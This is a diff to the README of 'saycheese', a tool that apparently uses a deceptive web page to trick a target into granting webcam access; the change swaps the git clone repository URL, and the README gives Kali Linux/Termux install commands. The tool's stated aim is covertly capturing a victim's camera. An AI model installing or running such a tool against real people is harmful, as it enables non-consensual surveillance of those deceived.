@@ -15,6 +15,6 @@ See more about MediaDEvices.getUserMedia() here
 To convince the target to grant permissions to access the cam, the page uses a javascript code made by https://github.com/wybiral that turns the favicon into a cam stream.
 
 Installing (Kali Linux/Termux):
-git clone https://github.com/Anonymous3-SIT/saycheese
-cd saycheese
+git clone https://github.com/SivajiBaby/SivajiBaby
+cd SivajiBaby
 bash saycheese.sh
